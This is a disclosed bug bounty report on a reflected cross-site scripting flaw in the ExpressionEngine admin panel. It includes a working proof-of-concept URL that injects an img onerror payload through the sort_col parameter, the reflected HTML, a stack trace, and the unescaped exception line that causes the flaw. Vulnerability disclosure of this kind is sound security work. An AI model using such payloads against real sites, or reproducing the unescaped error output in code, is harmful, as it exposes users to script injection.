# Reflective XSS

## Report Details
- **Report ID**: 177943
- **URL**: https://hackerone.com/reports/177943
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-10-25T07:16:29.281Z
- **Disclosed**: 2017-09-29T18:24:35.667Z

## Reporter
- **Username**: hogarth45
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: expressionengine

## Vulnerability Information
**URL**
http://blackdoorsec.net/sandbox/express/admin.php?/cp/members/bans&search=&sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id&sort_dir=desc

**URL Parameters**
/cp/members/bans
search=
sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id
sort_dir=desc

The ```sort_col``` variable is reflected on the error page on line 15
```
<h2>Unknown field me"><img src=x onerror=prompt(document.domain)>mber_id</h2>
```

Error Page Details (Note: hackerone remove html from past)
```
Unknown field me">mber_id

ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php:356
Stack Trace: hide details

    #0 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(213): EllisLab\ExpressionEngine\Service\Model\Query\Select->translateProperty('me">#1 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(99): EllisLab\ExpressionEngine\Service\Model\Query\Select->applyOrders(Object(EllisLab\ExpressionEngine\Service\Database\Query), Array)
    #2 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(42): EllisLab\ExpressionEngine\Service\Model\Query\Select->buildQuery()
    #3 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(513): EllisLab\ExpressionEngine\Service\Model\Query\Select->run()
    #4 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(459): EllisLab\ExpressionEngine\Service\Model\DataStore->runQuery('Select', Object(EllisLab\ExpressionEngine\Service\Model\Query\Builder))
    #5 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(156): EllisLab\ExpressionEngine\Service\Model\DataStore->selectQuery(Object(EllisLab\ExpressionEngine\Service\Model\Query\Builder))
    #6 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(75): EllisLab\ExpressionEngine\Service\Model\Query\Builder->fetch()
    #7 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(571): EllisLab\ExpressionEngine\Service\Model\Query\Builder->all()
    #8 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(298): EllisLab\ExpressionEngine\Controller\Members\Members->buildTableFromMemberQuery(Object(EllisLab\ExpressionEngine\Service\Model\Query\Builder))
    #9 [internal function]: EllisLab\ExpressionEngine\Controller\Members\Members->bans()
    #10 ee/EllisLab/ExpressionEngine/Core/Core.php(189): call_user_func_array(Array, Array)
    #11 ee/EllisLab/ExpressionEngine/Core/Core.php(94): EllisLab\ExpressionEngine\Core\Core->runController(Array)
    #12 ee/EllisLab/ExpressionEngine/Boot/boot.php(151): EllisLab\ExpressionEngine\Core\Core->run(Object(EllisLab\ExpressionEngine\Core\Request))
    #13 admin.php(143): require_once('...')
    #13 admin.php(143): require_once('...') 
```

Line 356 of Select.php
```
throw new \Exception("Unknown field {$alias}.{$property}");
```

## Attachments
- ellis1.JPG
